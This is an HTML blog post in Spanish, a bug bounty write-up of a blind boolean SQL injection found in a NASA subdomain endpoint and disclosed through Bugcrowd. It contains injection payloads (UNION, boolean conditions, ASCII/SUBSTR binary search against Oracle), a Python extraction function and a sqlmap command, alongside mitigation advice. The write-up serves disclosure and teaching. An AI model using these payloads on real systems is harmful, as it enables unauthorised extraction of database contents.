@@ -1,0 +1,455 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title id="page-title">SQLi en la NASA: cómo conseguí mi Letter of Recognition. Blog de Martín Dios</title>
+
+    <!-- Favicon support-->
+    <link rel="icon" type="image/x-icon" href="../logo/favicon.ico">
+    <link rel="icon" type="image/png" sizes="16x16" href="../logo/favicon-16x16.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="../logo/favicon-32x32.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="../logo/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="192x192" href="../logo/android-icon-192x192.png">
+
+    <meta name="description" content="Cómo descubrí una inyección SQL blind boolean en un subdominio de la NASA, logré bypassear el WAF y conseguí mi primera Letter of Recognition." id="meta-description">
+
+    <meta property="og:type" content="article">
+    <meta property="og:url" content="https://blog.martindios.com/posts/sqli-nasa.html">
+    <meta property="og:title" content="SQLi en la NASA: cómo conseguí mi Letter of Recognition — Martín González Dios" id="og-title">
+    <meta property="og:description" content="Cómo descubrí una inyección SQL blind boolean en un subdominio de la NASA, logré bypassear el WAF y conseguí mi primera Letter of Recognition." id="og-description">
+
+    <meta name="theme-color" content="#ffffff" id="theme-color-meta">
+
+    <style>
+        body {
+            margin: 1.25rem auto;
+            padding: 0 1.25rem;
+            max-width: 75rem;
+            font-family: inherit;
+        }
+
+        @media (max-width: 48rem) {
+            body {
+                margin: 0.625rem auto;
+                padding: 0 0.9375rem;
+            }
+        }
+
+        .nav-logo-blog {
+            margin-left: 1rem;
+        }
+
+        .nav-right {
+            display: flex;
+            gap: 1rem;
+            align-items: center;
+        }
+
+        select {
+            border-radius: 0.3125rem;
+            padding: 0.3125rem 0.625rem;
+            cursor: pointer;
+        }
+
+        body.dark-mode #lang-select {
+            background-color: rgb(40, 40, 40);
+            color: white;
+        }
+
+        .dark-mode {
+            background-color: #1a1a1a;
+            color: #e0e0e0;
+        }
+        .dark-mode a {
+            color: #4a9eff;
+        }
+        .dark-mode a:visited {
+            color: #bb86fc;
+        }
+        .dark-mode hr {
+            border-color: #444;
+        }
+        body.dark-mode #dark-mode-toggle {
+            background-color: rgb(40, 40, 40);
+            color: white;
+        }
+
+        nav {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        nav h4 {
+            margin: 0 0.9375rem 0 0;
+        }
+        .nav-left {
+            display: flex;
+            align-items: center;
+        }
+
+        button {
+            border-radius: 0.3125rem;
+            padding: 0.3125rem 0.625rem;
+            cursor: pointer;
+        }
+
+        article {
+            max-width: 75rem;
+            margin: 0 auto;
+        }
+
+        .post-meta {
+            color: #666;
+            font-size: 0.875rem;
+            margin-bottom: 1.5rem;
+        }
+        .dark-mode .post-meta {
+            color: #999;
+        }
+
+        pre {
+            overflow-x: auto;
+            background: #f4f4f4;
+            padding: 1rem;
+            border-left: 3px solid #666;
+            font-size: 0.875rem;
+            line-height: 1.5;
+        }
+        .dark-mode pre {
+            background: #111;
+            border-left-color: #555;
+            color: #e0e0e0;
+        }
+        code {
+            font-size: 0.9em;
+        }
+        p code, li code {
+            background: #f0f0f0;
+            padding: 0.1em 0.3em;
+            border-radius: 0.2em;
+        }
+        .dark-mode p code, .dark-mode li code {
+            background: #2a2a2a;
+        }
+
+        .callout {
+            border-left: 3px solid #888;
+            padding: 0.5rem 1rem;
+            margin: 1rem 0;
+            background: #f9f9f9;
+        }
+        .dark-mode .callout {
+            background: #222;
+            border-left-color: #666;
+        }
+        .callout.warning {
+            border-left-color: #c0392b;
+        }
+        .callout.info {
+            border-left-color: #2980b9;
+        }
+        .callout.success {
+            border-left-color: #27ae60;
+        }
+
+        img {
+            max-width: 100%;
+            height: auto;
+        }
+
+        figcaption {
+            color: #777; 
+            margin-top: 0.5rem; 
+            font-style: italic;
+        }
+
+        body.loading {
+            visibility: hidden;
+        }
+    </style>
+</head>
+<body>
+    <nav>
+        <div class="nav-left">
+            <a href="https://blog.martindios.com" aria-label="Inicio"><img src="../logo/android-icon-192x192.png" alt="Logo Martindios" height="32" width="32" style="display:block;"></a>
+            <a href="https://martindios.com" target="_blank" rel="noopener noreferrer" class="nav-logo-blog">martindios.com</a>
+        </div>
+        <div class="nav-right">
+            <select id="lang-select" onchange="switchLanguage(this.value)" aria-label="Idioma">
+                <option value="es" id="lang-es">Español</option>
+                <option value="gl" id="lang-gl">Galego</option>
+                <option value="en" id="lang-en">English</option>
+            </select>
+            <button onclick="toggleDarkMode()" id="dark-mode-toggle" aria-pressed="false">Dark Mode</button>
+        </div>
+    </nav>
+
+    <hr>
+
+    <main>
+        <article>
+
+            <h1 data-i18n="post_title">SQLi en la NASA: cómo conseguí mi LoR</h1>
+
+            <p class="post-meta">
+                30/06/2026 · Bug Bounty
+            </p>
+
+            <p data-i18n="intro">
+                Este es mi primer bug encontrado haciendo bug bounty, y uno del que estoy bastante orgulloso: un blind-boolean SQLi en un subdominio de la NASA. En este writeup explico cómo lo descubrí, cómo lo exploté y qué aprendí en el proceso.
+            </p>
+
+            <h2 data-i18n="h2_summary">Resumen</h2>
+            <p data-i18n="summary_p">
+                Un endpoint de un subdominio de la Nasa era vulnerable a inyección SQL sobre el parámetro <code>label</code>. El servidor devolvía el stack trace completo de Tomcat ante errores de sintaxis SQL (entre otros), revelando la consulta exacta y el DBMS (Oracle). Aunque el WAF bloqueaba las técnicas UNION-based más directas, fue posible exfiltrar datos mediante una técnica blind boolean con búsqueda binaria sobre ASCII.
+            </p>
+
+            <div class="callout info">
+                <strong>Programa:</strong> NASA Vulnerability Disclosure Policy &nbsp;·&nbsp;
+                <strong>Plataforma:</strong> Bugcrowd &nbsp;·&nbsp;
+                <strong>Severidad:</strong> P1 &nbsp;·&nbsp;
+                <strong>Estado:</strong> Resuelto
+            </div>
+
+
+            <h2 data-i18n="h2_recon">Reconocimiento</h2>
+            <p data-i18n="recon_p1">
+                Realizando reconocimiento para mapear los endpoints de un subdominio de la NASA, encontré uno que respondía con un <code>405 Method Not Allowed</code> a peticiones GET. El único método permitido era OPTIONS, pero la respuesta trajo algo inesperado: un archivo WADL con un listado completo de endpoints de la API.
+            </p>
+            <p data-i18n="recon_p2">
+                Gracias a pruebas previas en esta aplicación, sabía que en ciertos endpoints el stack trace de Tomcat estaba activo cuando se producía un error 500, un detalle que ha resultado importante. Entre los endpoints listados en el WADL, uno en particular llamó mi atención:
+            </p>
+
+            <pre><code>GET /abstract?label=document1</code></pre>
+
+            <p data-i18n="recon_p3">
+                El parámetro <code>label</code> recibe el identificador de un elemento y devuelve su descripción. Un buen sitio para probar algún tipo de inyección.
+            </p>
+
+
+            <h2 data-i18n="h2_analysis">Análisis de la vulnerabilidad</h2>
+            <p data-i18n="analysis_p1">
+                La prueba inicial fue tan simple como añadir una comilla simple al valor del parámetro:
+            </p>
+
+            <pre><code>GET /abstract?label=document1'</code></pre>
+
+            <p data-i18n="analysis_p2">
+                El servidor respondió con un <code>500 Internal Server Error</code> acompañado del stack trace completo de Tomcat. En él se filtraba la consulta SQL exacta que se estaba ejecutando, junto con una <code>SQLSyntaxErrorException</code> de Oracle. La comilla simple estaba siendo colocada directamente en la consulta sin ningún tipo de escapado ni parametrización, tal y como se puede ver en la siguiente imagen.
+            </p>
+
+            <figure>
+                <img src="stack-trace.png" alt="Ejemplo de stack trace de Tomcat mostrando un error de sintaxis SQL de Oracle en un entorno de laboratorio">
+                <figcaption>
+                    *Nota: La imagen muestra un ejemplo de stack trace en un entorno de laboratorio controlado; no pertenece al dominio real de la NASA.
+                </figcaption>
+            </figure>
+
+            <p data-i18n="analysis_p3">
+                La causa es la común en una inyección SQL: concatenación directa de input del usuario en una consulta, sin prepared statements ni validación de entrada.
+            </p>
+
+            <h2 data-i18n="h2_poc">Explotación</h2>
+            <p data-i18n="poc_p1">
+                El paso natural era intentar un <code>UNION SELECT</code> para exfiltrar datos directamente. Sin embargo, el WAF bloqueaba cualquier petición que contuviera la palabra <code>UNION</code>:
+            </p>
+
+            <pre><code>GET /abstract?label=document1' UNION SELECT user,null,null FROM dual--
+ 403 Forbidden (WAF)</code></pre>
+
+            <p data-i18n="poc_p2">
+                Ante esto, la alternativa era un blind boolean SQLi: en lugar de extraer datos directamente, se evalúan condiciones booleanas y se infiere la información carácter a carácter a partir del comportamiento del servidor.
+            </p>
+            <p data-i18n="poc_p3">
+                La técnica se verificó fácilmente con dos payloads:
+            </p>
+
+            <pre><code>-- Condición verdadera: respuesta normal con contenido
+GET /abstract?label=document1' AND 7348=7348--
+
+-- Condición falsa: 200 OK pero respuesta vacía
+GET /abstract?label=document1' AND 7348=7349--</code></pre>
+
+            <p data-i18n="poc_p4">
+                Confirmado el comportamiento, el siguiente paso fue desarrollar una prueba de concepto para demostrar que la vulnerabilidad permitía la extracción real de datos. Como demostración, planteé la exfiltración del nombre del usuario de la base de datos mediante búsqueda binaria sobre el valor ASCII de cada carácter. Oracle dispone de las funciones <code>ASCII()</code> y <code>SUBSTR()</code> para esto, y la <a href="https://docs.oracle.com/en/database/oracle/oracle-database/19/sqlrf/Selecting-from-the-DUAL-Table.html" target="_blank" rel="noopener noreferrer">tabla especial <code>dual</code></a> actúa como tabla auxiliar de una sola fila:
+            </p>
+
+            <pre><code>-- ¿Es el primer carácter del usuario mayor que 'M' (77 en ASCII)?
+GET /abstract?label=document1' AND 1=(SELECT 1 FROM dual WHERE ASCII(SUBSTR(user,1,1))>77)--</code></pre>
+
+            <p data-i18n="poc_p5">
+                Automaticé la extracción con un script Python que implementa búsqueda binaria:
+            </p>
+
+            <pre><code>def extract_string(target_expr, length):
+    result = ""
+    for pos in range(1, length + 1):
+        lo, hi = 32, 127
+        while lo <= hi:
+            mid = (lo + hi) // 2
+            if boolean_query(f"ASCII(SUBSTR({target_expr},{pos},1))>{mid}"):
+                lo = mid + 1
+            else:
+                hi = mid - 1
+        result += chr(lo)
+    return result</code></pre>
+
+            <p data-i18n="poc_p6">
+                Después del reporte me di cuenta de que <code>sqlmap</code> también lo resuelve directamente con un único comando:
+            </p>
+
+            <pre><code>sqlmap -u "https://subdomain.nasa.gov/abstract?label=document1" \
+  --technique=B --dbms=Oracle --level=3 --batch</code></pre>
+
+            <h2 data-i18n="h2_impact">Impacto</h2>
+            <p data-i18n="impact_p">
+                El impacto de una inyección SQL siempre suele ser considerable. En este caso concreto, la vulnerabilidad permitía: exfiltración de datos de la base de datos Oracle, reconocimiento de infraestructura interna (usuario de BD, versión, esquemas) y, dependiendo de los privilegios del usuario de la base de datos, una potencial escalada hacia otras partes del sistema.
+            </p>
+
+
+            <h2 data-i18n="h2_mitigation">Mitigación</h2>
+            <p data-i18n="mitigation_p">
+                La solución pasa por dos cambios fundamentales: reemplazar la concatenación de strings en las consultas SQL por prepared statements con parámetros vinculados, y deshabilitar el stack trace de Tomcat en producción para no exponer información interna ante errores. El WAF aportaba cierta protección frente a técnicas básicas, pero como demostró este caso, no es una defensa suficiente por sí sola.
+            </p>
+
+
+            <h2 data-i18n="h2_conclusions">Conclusiones</h2>
+            <p data-i18n="conclusions_p">
+                Este fue mi primer bug en bug bounty, y la experiencia fue muy satisfactoria. Lo que empezó con una comilla simple terminó siendo un P1 en la NASA. Algunos aprendizajes que me llevo: el WADL fue clave para descubrir el endpoint vulnerable; el stack trace activo en producción convirtió un posible blind SQLi en una vulnerabilidad mucho más sencilla de identificar y explotar; y un WAF no reemplaza el código seguro, como demuestra el hecho de que el bypass booleano funcionara sin mayor dificultad.
+            </p>
+
+
+            <h2 data-i18n="h2_references">Referencias</h2>
+            <ul>
+                <li><a href="https://bugcrowd.com/disclosures/d854e13a-f8fb-47a1-bd86-93538c60f1c6/blind-boolean-based-sql-injection-in-label-parameter-allows-unauthenticated-database-enumeration" target="_blank" rel="noopener noreferrer">Disclosure report in Bugcrowd</a></li>
+                <li><a href="https://owasp.org/www-community/attacks/SQL_Injection" target="_blank" rel="noopener noreferrer">OWASP: SQL Injection</a></li>
+                <li><a href="https://portswigger.net/web-security/sql-injection/blind" target="_blank" rel="noopener noreferrer">PortSwigger: Blind SQL injection</a></li>
+                <li><a href="https://docs.oracle.com/en/database/oracle/oracle-database/19/sqlrf/DUAL-Table.html" target="_blank" rel="noopener noreferrer">Oracle Docs: DUAL Table</a></li>
+            </ul>
+
+        </article>
+    </main>
+
+    <footer>
+        <hr>
+        <p><small>Martín González Dios.</small></p>
+    </footer>
+
+    <script>
+        let translations = {};
+        let currentLang = 'es';
+
+        async function loadTranslations() {
+            try {
+                const response = await fetch('./translations-sqli-nasa.json');
+                translations = await response.json();
+            } catch (error) {
+                console.error('Error loading translations:', error);
+            }
+        }
+
+        function updateContent() {
+            document.querySelectorAll('[data-i18n]').forEach(element => {
+                const key = element.getAttribute('data-i18n');
+                if (translations[currentLang] && translations[currentLang][key]) {
+                    element.innerHTML = translations[currentLang][key];
+                }
+            });
+
+            updateMetaTags();
+        }
+
+        function updateMetaTags() {
+            if (!translations[currentLang]) return;
+
+            const t = translations[currentLang];
+
+            if (t.page_title) document.getElementById('page-title').textContent = t.page_title;
+            if (t.og_title) document.getElementById('og-title').setAttribute('content', t.og_title);
+            if (t.og_description) document.getElementById('og-description').setAttribute('content', t.og_description);
+            if (t.og_description) document.getElementById('meta-description').setAttribute('content', t.og_description);
+            if (t.html_lang) document.documentElement.lang = t.html_lang;
+        }
+
+        function switchLanguage(language) {
+            currentLang = language;
+            updateContent();
+            localStorage.setItem('preferredLanguage', language);
+
+            const sel = document.getElementById('lang-select');
+            if (sel) sel.value = language;
+
+            document.documentElement.lang = language;
+        }
+
+        function toggleDarkMode() {
+            const body = document.body;
+            const button = document.getElementById('dark-mode-toggle');
+            const themeColorMeta = document.getElementById('theme-color-meta');
+
+            if (body.classList.contains('dark-mode')) {
+                body.classList.remove('dark-mode');
+                button.textContent = translations[currentLang]?.dark_mode || 'Dark Mode';
+                button.setAttribute('aria-pressed', 'false');
+                themeColorMeta.setAttribute('content', '#ffffff');
+                localStorage.setItem('darkMode', 'false');
+            } else {
+                body.classList.add('dark-mode');
+                button.textContent = translations[currentLang]?.light_mode || 'Light Mode';
+                button.setAttribute('aria-pressed', 'true');
+                themeColorMeta.setAttribute('content', '#1a1a1a');
+                localStorage.setItem('darkMode', 'true');
+            }
+        }
+
+        function loadPreferences() {
+            try {
+                const themeColorMeta = document.getElementById('theme-color-meta');
+
+                const savedDarkMode = localStorage.getItem('darkMode');
+                if (savedDarkMode === 'true') {
+                    document.body.classList.add('dark-mode');
+                    const button = document.getElementById('dark-mode-toggle');
+                    button.textContent = translations[currentLang]?.light_mode || 'Light Mode';
+                    button.setAttribute('aria-pressed', 'true');
+                    themeColorMeta.setAttribute('content', '#1a1a1a');
+                } else {
+                    themeColorMeta.setAttribute('content', '#ffffff');
+                }
+
+                const savedLanguage = localStorage.getItem('preferredLanguage');
+                if (savedLanguage && ['es', 'gl', 'en'].includes(savedLanguage)) {
+                    return savedLanguage;
+                }
+
+                const browserLang = navigator.language || navigator.userLanguage;
+                if (browserLang.startsWith('en')) return 'en';
+                if (browserLang.startsWith('gl')) return 'gl';
+                return 'es';
+            } catch (error) {
+                console.warn('localStorage not available:', error);
+                try {
+                    const browserLang = navigator.language || navigator.userLanguage;
+                    if (browserLang.startsWith('en')) return 'en';
+                    if (browserLang.startsWith('gl')) return 'gl';
+                } catch (e) {
+                    console.warn('Could not detect browser language');
+                }
+                return 'es';
+            }
+        }
+
+        document.body.classList.add('loading');
+
+        document.addEventListener('DOMContentLoaded', async function () {
+            await loadTranslations();
+
+            const defaultLang = loadPreferences();
+            switchLanguage(defaultLang);
+
+            document.body.classList.remove('loading');
+        });
+    </script>
+</body>
+</html>
